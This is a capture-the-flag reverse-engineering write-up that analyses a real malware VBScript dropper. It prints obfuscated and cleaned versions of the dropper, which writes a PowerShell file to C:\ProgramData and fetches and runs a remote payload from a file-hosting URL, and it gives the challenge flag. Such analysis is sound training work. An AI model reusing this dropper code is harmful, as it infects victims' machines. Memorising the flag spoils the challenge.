# InfeXion 2/4 

### Category

Reverse

### Description

A script named `qk7kvg.VBS` appears to have been executed on the victim's machine. Find the next step in the infection chain!

**Warning : This series of challenges contains real world malware. Do not execute it on your host, use a VM !!**

The flag corresponds to the URL and the Windows path of the downloaded file, e.g. `Hero{https://dropbox.com/file/xyz|C:\Windows\Temp\malware.exe}`.

Format : Hero{URL|FULL\_PATH}<br>
Author : xanhacks

### Write Up

From the previous step, we know that the file at `https://files.catbox.moe/qk7kvg.VBS` will be executed.

Here is the content of the file:

```vbscript
On Error Resume Next

Dim fsdffssfsdfsdffsf,ryryytryryyryrytryyrtyryry,cvbcvbcbcvbvvcv101010101

cvbcvbcbcvbvvcv101010101 = "Invoke-Expression((n`e`W`-Obj`E`c`T (('N'+'e'+'t'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'.'+'W'+'eb'+'c'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'li'+'en'+'t'))).(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://files.catbox.moe/vidyud.jpg'))))"

Set F = CreateObject("Scripting.FileSystemObject")
Set File = F.CreateTextFile("C:\ProgramData\rrrrrrrr.ps1",True)
File.Write cvbcvbcbcvbvvcv101010101
File.Close

Set fsdffssfsdfsdffsf = CreateObject("wscript.shell")
ryryytryryyryrytryyrtyryry = chr(80) +"ow" & "ershell -executionpolicy remotesigned -File ""C:\ProgramData\rrrrrrrr.ps1"""

fsdffssfsdfsdffsf.Run ryryytryryyryrytryyrtyryry,0
```

We can easily deobfuscate it and rename variables to obtain a more readable format:

```vbscript
On Error Resume Next

Dim shellObj,cmdStr,powershellStr

powershellStr = "(New-Object Net.Webclient).DownloadString("https://files.catbox.moe/vidyud.jpg")"

Set F = CreateObject("Scripting.FileSystemObject")
Set File = F.CreateTextFile("C:\ProgramData\rrrrrrrr.ps1",True)
File.Write powershellStr
File.Close

Set shellObj = CreateObject("wscript.shell")
cmdStr = "powershell -executionpolicy remotesigned -File 'C:\ProgramData\rrrrrrrr.ps1'"

shellObj.Run cmdStr,0
```

This VBScript file will download a Powershell script from `https://files.catbox.moe/vidyud.jpg`, save it at `C:\ProgramData\rrrrrrrr.ps1'` and execute it. 

### Flag

**Hero{https://files.catbox.moe/vidyud.jpg|C:\ProgramData\rrrrrrrr.ps1}**
